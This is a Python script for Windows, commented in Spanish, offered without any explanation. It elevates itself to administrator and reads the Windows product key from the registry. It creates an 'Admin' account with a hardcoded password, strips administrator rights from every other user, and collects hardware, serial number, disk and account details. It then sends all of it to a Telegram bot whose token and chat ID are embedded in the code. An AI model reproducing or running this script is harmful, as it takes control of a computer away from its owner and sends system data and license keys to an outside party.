import ctypes
import subprocess
import psutil
import wmi
import winreg
import requests
import sys

# Token del bot y Chat ID
TOKEN = "7899150986:AAERjV1Esft3QK1Ss8oOeG7hscXq-Nn8FQ4"
CHAT_ID = "7899422668"

def is_admin():
    #Comprueba si el script se está ejecutando con privilegios de administrador.
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    #Reinicia el script con privilegios de administrador.
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

if not is_admin():
    run_as_admin()
    sys.exit()

def enviar_a_telegram(mensaje):
    #Envía un mensaje al chat de Telegram.
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": mensaje
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Mensaje enviado a Telegram con éxito.")
        else:
            print(f"Error al enviar mensaje: {response.text}")
    except Exception as e:
        print(f"Error al conectarse a Telegram: {e}")

def obtener_clave_windows():
    #Obtiene la clave de producto de Windows desde el registro.
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform")
        value, _ = winreg.QueryValueEx(key, "BackupProductKeyDefault")
        winreg.CloseKey(key)

        # Decodificar la clave del producto
        return value
    except Exception as e:
        return "No disponible"

# Obtener la clave de producto de Windows
licencia = obtener_clave_windows()

def obtener_usuarios():
    #Obtiene la lista de usuarios en la computadora.
    c = wmi.WMI()
    usuarios = [user.Name for user in c.Win32_UserAccount()]
    return usuarios

def crear_usuario_admin():
    #Crea un usuario 'Admin' con contraseña 'Z3pu0rg' y lo agrega al grupo de administradores si no existe.
    resultado = ""
    try:
        # Verificar si el usuario 'Admin' ya existe
        usuarios = obtener_usuarios()
        if 'Admin' not in usuarios:
            # Crear el usuario 'Admin'
            subprocess.run(['net', 'user', 'Admin', 'Z3pu0rg', '/add'], check=True)
            try:
                subprocess.run(['net', 'localgroup', 'Administradores', 'Admin', '/add'], check=True)
            except subprocess.CalledProcessError:
                subprocess.run(['net', 'localgroup', 'Administrators', 'Admin', '/add'], check=True)
            resultado = "Usuario 'Admin' creado y agregado al grupo de administradores."
        else:
            resultado = "El usuario 'Admin' ya existe."
    except Exception as e:
        resultado = f"Error al crear el usuario 'Admin': {e}"
    return resultado


def quitar_otros_admins():
    #Quita a los demás usuarios del grupo de administradores.
    resultado = ""
    try:
        usuarios = obtener_usuarios()
        for usuario in usuarios:
            if usuario and usuario != 'Admin' and usuario != 'Nombre de alias' and usuario != 'Administrador' and usuario != 'Administrator' and usuario != 'DefaultAccount' and usuario != 'Guest' and usuario != 'Administrator' and usuario != 'WDAGUtilityAccount':
                try:
                    subprocess.run(['net', 'localgroup', 'Administradores', usuario, '/delete'])
                except subprocess.CalledProcessError:
                    subprocess.run(['net', 'localgroup', 'Administrators', usuario, '/delete'])
                resultado += f"Usuario '{usuario}' quitado del grupo de administradores.\n"
    except Exception as e:
        resultado += f"Error al quitar usuarios del grupo de administradores: {e}"
    return resultado

def obtener_info_pc():
    # Inicializar WMI
    c = wmi.WMI()

    # Marca y modelo
    try:
        computer_info = c.Win32_ComputerSystem()[0]
        marca = computer_info.Manufacturer
        modelo = computer_info.Model
    except Exception:
        marca, modelo = "Desconocido", "Desconocido"

    # Número de serie
    try:
        bios_info = c.Win32_BIOS()[0]
        numero_serie = bios_info.SerialNumber
    except Exception:
        numero_serie = "Desconocido"

    # Procesador (modelo completo)
    try:
        procesador_info = c.Win32_Processor()[0]
        procesador = procesador_info.Name
    except Exception:
        procesador = "Desconocido"

    # RAM
    ram_total = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # En GB

    # Información de discos
    discos = []
    for particion in psutil.disk_partitions():
        try:
            uso_disco = psutil.disk_usage(particion.mountpoint)
            discos.append({
                "Disco": particion.device,
                "Total (GB)": round(uso_disco.total / (1024 ** 3), 2),
                "Usado (GB)": round(uso_disco.used / (1024 ** 3), 2),
                "Libre (GB)": round(uso_disco.free / (1024 ** 3), 2)
            })
        except PermissionError:
            # Ignorar particiones no accesibles
            continue

    # Usuarios
    usuarios = obtener_usuarios()

    # Formatear resultados
    mensaje = f"Marca: {marca}\nModelo: {modelo}\nNúmero de Serie: {numero_serie}\nLicencia de Windows: {licencia}\nProcesador: {procesador}\nRAM Total (GB): {ram_total}\n Creacion de Admin \n{crear_usuario_admin()}\n\n{quitar_otros_admins()}"
    mensaje += "Información de Discos:\n"
    for disco in discos:
        mensaje += f"- {disco['Disco']}: Total={disco['Total (GB)']} GB, Usado={disco['Usado (GB)']} GB, Libre={disco['Libre (GB)']} GB\n"
    mensaje += "Usuarios:\n" + "\n".join(usuarios)
    return mensaje

# Crear usuario 'Admin' y ajustar permisos
crear_usuario_admin()
quitar_otros_admins()

# Obtener información y enviarla a Telegram
info_pc = obtener_info_pc()
enviar_a_telegram(info_pc)